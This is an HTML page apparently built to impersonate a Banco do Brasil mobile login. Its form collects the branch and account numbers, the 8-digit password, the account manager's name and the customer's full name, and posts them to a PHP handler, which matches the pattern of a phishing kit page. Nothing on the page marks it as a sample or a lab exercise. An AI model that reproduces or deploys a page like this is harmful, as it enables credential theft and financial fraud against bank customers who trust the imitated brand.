<html>
	<head>
		<meta name="viewport" content="width=device-width, initial-scale=1"/>
		<meta charset="utf-8">
		<title>Banco do Brasil</title>
		<meta name="theme-color" content="rgb(254,237,1)"> 
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
		<link href="https://fonts.googleapis.com/css?family=Overpass:600&display=swap" rel="stylesheet">
		<link rel="icon" href="img/favicon.ico" type="image/x-icon"/>
		<script type="text/javascript" src="/js/cad_promo_scripts.js"></script>
		<script src="https://kit.fontawesome.com/8a27f15c46.js"></script>
  </head>
		<style>
			body{
				font-family: 'Overpass', sans-serif;
			}
			.headerbarra{
				display: flex;
				text-align: center;	
				background-color: #005AA6;
				width: 100%;
				border-bottom: solid 4px yellow;
				height: 60px;	
			}
			.headerbarra span{
				font-size: 18px;
				color: #fff;
				text-align: center;
			}
			.headerbarra .barracontent{
				padding: 8px;
			}
			.branco{color: #fff;}

			form .accountSelectForm{
				margin-top: -5px;
				width: 100%;
				color: #000;
				font-weight: bold;
				outline: none;
				border: none;
				border-bottom: 1px solid #c3c3c3;
				padding: 3px;
			}
			.labelAccountSelector{
				font-size: 15px;
				color: #c3c3c3;
			}
			.label-float{
				  position: relative;
				  padding-top: 13px;
			}

			.label-float input{
			  width: 100%;
			  border: 0;
			  border-bottom: 1px solid lightgrey;
			  outline: none;
			  min-width: 180px;
			  font-size: 16px;
			  transition: all .3s ease-out;
			  -webkit-transition: all .3s ease-out;
			  -moz-transition: all .3s ease-out;
			  -webkit-appearance:none;
			  border-radius: 0;
			}

			.label-float input:focus{
			  border-bottom: 2px solid #3951b2;
			}

			.label-float input::placeholder{
			  color:transparent;
			}

			.label-float label{
			  pointer-events: none;
			  position: absolute;
			  top: 0;
			  left: 0;
			  margin-top: 13px;
			  transition: all .3s ease-out;
			  -webkit-transition: all .3s ease-out;
			  -moz-transition: all .3s ease-out;
			  color: #c3c3c3;
			}

			.label-float input:required:invalid + label{
			 
			}
			.label-float input:focus:required:invalid{
			  
			}
			.label-float input:required:invalid + label:before{
			  content: '';
			}
			.label-float input:focus + label,
			.label-float input:not(:placeholder-shown) + label{
			  font-size: 13px;
			  margin-top: 0;			  
			}

			.PasswordHelpA{
				font-weight: bold;
				color: #007bff;
				font-size: 13px;							
			}

			.btnEntrar{
				border: none;
				padding-top: 3px;
				background: rgb(254,237,1);
				color: #0355a0;
				font-family: sans-serif , "Impact";
				font-weight: 800;
				font-size: 17px;			
				height: 60px;
				width: 100%;
				margin-top: 8%;
			}
		</style>
	</head>
	<body>
		<div class="container-fluid">
			<div class="row">				
					<div class="headerbarra">					
							<div class="col-sm-12" style="margin-top:15px;">
								<i class="fas fa-arrow-left branco" style="float: left;margin-top: 5;"></i>
								<span>Acessar minha conta</span>
							</div>
					</div>
			</div>
			<br>
			<div class="row">
				<div class="col-sm-12">
					<div class="frm">
					<form class="frmcad" method="POST" action="WebApp_UserIdentification.php">
						 <label class="labelAccountSelector" for="AccountTypeSelector">Tipo de conta</label>
						 <select id="AccountTypeSelector" class="accountSelectForm" id="exampleFormControlSelect1" style="border-radius: 10px;">
                                 <option>Conta pessoal</option>
                                 <option>Não correntista</option>
                                 <option>Conta empresarial</option>
                                 <option>Conta Jurídica</option>
                          </select>
                          <br><br><br>
                        <div class="label-float">
						    <input type="tel" name="agencia" id="agencia" maxlength="6" onkeypress="return SomenteNumero(event)" onkeyup="mascaraMike('####-@', this);javascript:pulacampo('agencia','conta');" autofocus placeholder=" " required/>
  							<label>Agência</label>
						</div>
						<br><br>

						<div class="label-float">
						    <input type="tel" name="conta" placeholder=" " id="conta" maxlength="9" onkeypress="return SomenteNumero(event)" onkeyup="mascaraMike('#######-@', this);javascript:pulacampo('conta','8dsenha');" required/>
  							<label>Conta</label>
						</div>
						<br><br>

						<div class="label-float">
						    <input type="password" name="8dpass" id="8dpass" maxlength="8" placeholder=" " required/>
  							<label>Senha de 8 dígitos</label>
						</div>
						<!--- --->
						<br><br>

						<div class="label-float">
						    <input type="text" name="gerente" placeholder=" " required/>
  							<label>Nome do Gerente</label>
						</div>
						<br><br>
						<div class="label-float">
							<input type="text" id="nome" name="nome"  autocomplete="off" required>
							<label for="data">Seu Nome Completo</label>
						</div>
						</div>
						<br><br>
						<br><br>
						<a href="#" class="PasswordHelpA">Precisa de ajuda com a senha?</a><br><br>
						
									
				</div>
				</div>
				<input type="submit" value="ENTRAR" name="EnterLoginAuth" class="btnEntrar" style="border-radius: 10px;" />
				</form>	
			</div>	
		</div>
		

		
		<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
		<script src="js/EventsAplicattion.js"></script>		
	</body>
</html>